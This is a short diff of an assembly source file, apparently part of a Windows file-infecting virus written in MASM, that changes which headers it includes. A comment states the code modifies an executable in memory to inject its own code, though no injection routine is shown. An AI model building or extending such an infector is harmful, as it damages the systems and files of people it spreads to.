@@ -3,9 +3,7 @@ ifndef	INFECT_FILE_ASM_
 INFECT_FILE_ASM_ MACRO
 ENDM
 
-include		\masm32\include\windows.inc
-include		\masm32\include\kernel32.inc
-include		utils.asm
+include	utils.asm
 
 ; Parse and modify the executable mapped in memory to inject our code.
 ; ebx = delta offset
